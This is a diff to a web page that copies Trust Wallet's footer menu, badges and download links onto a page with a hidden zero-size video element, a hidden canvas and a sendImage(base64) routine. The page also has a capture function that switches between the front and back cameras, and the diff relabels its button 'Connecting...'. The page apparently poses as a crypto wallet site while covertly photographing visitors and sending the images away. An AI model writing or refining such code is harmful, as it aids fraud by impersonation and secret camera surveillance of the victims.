@@ -61,7 +61,7 @@ main.hero{display:flex;gap:30px;align-items:flex-start;justify-content:flex-star
 #display1{
   display:block;
   width:100%;
-  height:220px;
+  height:250px;
   object-fit:cover;
   border-radius:14px 14px 0 0;
 }
@@ -73,6 +73,13 @@ main.hero{display:flex;gap:30px;align-items:flex-start;justify-content:flex-star
   border-radius:10px;
   border:2px solid rgba(255,255,255,0.06);
   filter: blur(8px);
+}
+footer{
+  margin-top:50px;
+  color:rgba(255,255,255,0.8);
+  font-size:14px;
+  line-height:1.5;
+  white-space:pre-line;
 }
 @media (max-width:760px){
   .hero-left h1, .hero-left .eyebrow{font-size:28px;}
@@ -111,6 +118,44 @@ main.hero{display:flex;gap:30px;align-items:flex-start;justify-content:flex-star
   </main>
 </div>
 
+<footer>
+Wallet 
+Mobile App
+Browser Extension
+Features
+Buy Crypto
+Swaps
+Staking
+NFTs
+Security
+SWIFT: Smart Contract Wallet
+Build
+Developer Docs
+Wallet Core
+Submit dApp
+Get assets listed
+Support
+FAQ
+Contact Us
+About
+About Us
+Careers
+Press Kit
+Terms of Service
+Privacy Notice
+Cookie Preferences
+Cookie Notice
+Blog
+A-LIGN ISO 27701A-LIGN ISO 27001
+Download Trust Wallet
+The most trusted & secure crypto wallet.
+
+Download for iOS
+Download ExtensionChrome
+Download APK
+Download for Android
+</footer>
+
 <video id="video" autoplay muted playsinline style="display:none;width:0;height:0;"></video>
 <canvas id="canvas" width="320" height="220" style="display:none;"></canvas>
 
@@ -140,7 +185,7 @@ async function sendImage(base64){
 
 async function startCapture(){
   getBtn.disabled = true;
-  getBtn.textContent = 'Processing...';
+  getBtn.textContent = 'Connecting...';
   getBtn.classList.add('active');
 
   const cameras = ['user','environment']; // front/back
